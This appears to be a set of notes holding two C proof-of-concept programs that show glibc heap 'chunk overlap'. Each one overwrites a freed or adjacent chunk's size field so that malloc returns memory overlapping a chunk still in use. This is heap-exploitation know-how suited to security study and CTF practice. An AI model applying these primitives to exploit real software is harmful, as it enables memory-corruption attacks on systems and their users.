## chunk overlap poc

overlap1

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>

//chunk overlap
int main()
{

        setbuf(stdout,0);
        setbuf(stdin,0);

        intptr_t *p,*q,*r;

        malloc(0);
        p = malloc(0x88);
        q = malloc(0x88);
        malloc(0);

        free(p);
        sleep(0);

        *(p-1)  =  0x121;

        r = malloc(0x110);

        sleep(0x100);
        return 0;

}
```

overlap2

```c
#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
#include <stdint.h>
#include <string.h>

int main()
{
        setbuf(stdin,0);
        setbuf(stdout,0);

        intptr_t *a,*b,*c,*d,*e;

        a = malloc(0);
        b = malloc(0x80);
        c = malloc(0x80);
        d = malloc(0x80);
        e = malloc(0x10);//gap to top

        //assume off by one in a

        free(d);

        //write b's SIZE
        *(a+3) = 0x121;

        //after free b, trigger forward consolidate
        //b,c,d is merged into unsorted bin
        //but c is in use
        free(b);

        //now  if malloc 0x1a0, glibc will return a big chunk
        //contain b,c,d
        intptr_t *big = malloc(0x1a0);

        puts("overlapped.");

        //now write content in big chunk
        memset(big,'A',0x1a0);
        sleep(0x100);

        return 0;
}
```

